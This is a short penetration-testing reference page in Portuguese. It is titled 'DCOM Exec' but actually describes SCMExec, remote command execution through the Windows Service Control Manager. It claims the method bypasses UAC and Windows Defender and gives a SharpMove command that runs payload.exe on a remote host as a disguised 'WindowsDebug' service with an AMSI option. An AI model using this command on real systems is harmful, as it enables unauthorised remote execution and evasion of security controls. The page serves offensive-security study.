# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** é uma técnica para executar comandos em sistemas remotos usando o Service Control Manager (SCM) para criar um serviço que executa o comando. Este método pode contornar alguns controles de segurança, como o User Account Control (UAC) e o Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
